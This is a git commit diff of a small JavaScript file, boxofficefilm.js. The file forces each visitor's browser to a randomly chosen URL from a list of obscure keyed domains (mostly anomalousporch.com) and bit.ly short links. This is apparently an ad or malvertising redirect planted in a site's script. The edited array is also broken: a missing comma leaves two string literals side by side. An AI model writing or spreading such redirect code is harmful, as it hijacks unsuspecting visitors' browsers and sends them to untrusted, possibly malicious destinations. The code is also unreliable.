7470f5b4948ad5d52b51ed4c37fc3cd93f36fced
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2022-03-21 01:10:53 -0700

    Update boxofficefilm.js

--- boxofficefilm.js
+++ boxofficefilm.js
@@ -1,12 +1,11 @@
 var dataUrl = [
 '//anomalousporch.com/s12ygwr4j?key=0c236aab12a231150e5db3f8b366197c',
-'//wavermerchandiseweird.com/z0sfd1pts?key=2431d39c120107799ee55bcab97fc536',
-'https://bit.ly/3puU5Wt',
+'//anomalousporch.com/s12ygwr4j?key=0c236aab12a231150e5db3f8b366197c'
 '//anomalousporch.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67',
-'https://bit.ly/3hZfPFz',
-'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
+'//anomalousporch.com/e5ntk4vw2?key=afc46c163b5e7aa15937edf1b69b82cc',
 '//anomalousporch.com/bcf9j7den?key=6f0346ec565f3485f607d1f027ca2032',
-'//wavermerchandiseweird.com/tuf9tdkp?key=6729f99d594d33885cec1eb3981e92ac'
+'//anomalousporch.com/fweeqvjv8d?key=d248834943f3e7e44e8f940e6f85f7e2',
+'https://bit.ly/3puU5Wt'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
